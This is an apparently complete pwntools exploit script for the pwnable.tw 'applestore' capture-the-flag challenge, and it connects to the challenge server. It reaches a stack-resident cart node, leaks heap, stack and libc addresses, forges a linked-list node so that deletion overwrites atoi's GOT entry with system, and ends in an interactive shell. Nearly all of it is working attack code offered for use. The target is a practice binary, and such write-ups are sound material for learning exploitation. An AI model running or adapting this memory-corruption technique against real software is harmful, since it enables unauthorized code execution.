from pwn import *

def add_device(idx):
        p.sendline(b'2')
        if type(idx) == int:
                p.sendlineafter(b'Device Number> ', str(idx).encode())
        elif type(idx) == bytes:
                p.sendlineafter(b'Device Number> ', idx)

def remove_device(idx):
        p.sendline(b'3')

        if type(idx) == int:
                p.sendlineafter(b'Item Number> ', str(idx).encode())
        elif type(idx) == bytes:
                p.sendlineafter(b'Item Number> ', idx)

def list_cart(option = b'y'):
        p.sendline(b'4')
        print(p.recvuntil(b'Let me check your cart. ok? (y/n) > ').decode())
        p.sendline(option)

def checkout(option = b'y'):
        p.sendline(b'5')
        print(p.recvuntil(b'Let me check your cart. ok? (y/n) > ').decode())
        p.sendline(option)
        print(p.recvuntil(b"Want to checkout? Maybe next time!").decode())

def set_total_for_iphone8():
        for i in range(19):                                             # 199 * 19 = 3781
                add_device(1)
                print(p.recvuntil(b"Brilliant! That's an amazing idea.").decode())

        add_device(4)                                                   # 3781 + 399 = 4180
        print(p.recvuntil(b"Brilliant! That's an amazing idea.").decode())

        for i in range(6):                                              # 4180 + 499 * 6 = 7174
                add_device(3)
                print(p.recvuntil(b"Brilliant! That's an amazing idea.").decode())

context.clear(terminal = ['tmux', 'splitw', '-fh'])

libc = ELF('./libc_32.so.6')

myCart_addr = 0x804b068
atoi_got_addr = 0x804b040

gdb1 = '''
b *handler+72
b *add+72
c
'''

b_after_ip8 = '''
b *handler+72 if $eax == 5
c
d
b delete
c
b *cart+173
c
c 84
'''

b_on_second_delete = '''
b *delete+95 if $eax == 8
c
c 19
set follow-fork-mode parent
'''
'''b cart
c
'''

#p = process('./applestore', env={'LD_PRELOAD':'./libc_32.so.6'})
#p = gdb.debug('./applestore', b_on_second_delete, env={'LD_PRELOAD':'./libc_32.so.6'})
p = remote('chall.pwnable.tw', 10104)

print(p.recvuntil(b'> ').decode())

set_total_for_iphone8()
checkout()

# can enter delete() to set value of stack ptr in next ptr on heap through input
# chars 3-6 are the value of the stack ptr
# since we can write up to 21 bytes, this is enough to be a node *. Can make a fake chunk to arb write to next/prev
list_cart(b'y\x00' + p32(myCart_addr + 8) + p32(myCart_addr + 8) + p32(myCart_addr + 8) + p32(myCart_addr + 8))
p.recvuntil(b'27: ')

heap_peek = u32(p.recv(4)) + 0x3e0
print(f'[+] heap peek\t@ {hex(heap_peek)}')
print(p.recvuntil(b'> '))

list_cart(b'y\x00' + p32(heap_peek) + p32(heap_peek) + p32(heap_peek) + p32(heap_peek))
p.recvuntil(b'27: ')

stack_peek = u32(p.recv(4))
print(f'[+] stack peek\t@ {hex(stack_peek)}')
print(p.recvuntil(b'> '))

list_cart(b'y\x00' + p32(heap_peek + 0x30) + p32(heap_peek + 0x30) + p32(heap_peek + 0x30) + p32(heap_peek + 0x30))
p.recvuntil(b'27: ')

libc.address = u32(p.recv(4)) - 0x1b07b0
print(f'[+] libc base\t@ {hex(libc.address)}')
print(p.recvuntil(b'> '))

system = libc.sym['system']

# remove items 10 - 26 to send a 1 byte integer
for i in range(19):
        remove_device(26 - i)
        print(p.recvuntil(b'> ').decode())

# create a fake node
name = p32(heap_peek - 8)
price = p32(9999)
next = p32(atoi_got_addr + 0x22 - 8)
prev = p32(stack_peek + 24)

# remove fake node to write to a writable page
remove_device(b'8\x00' + name + price + next + prev)

p.sendlineafter(b'> ', b'/bin/sh\x00' + p32(system))

p.interactive()
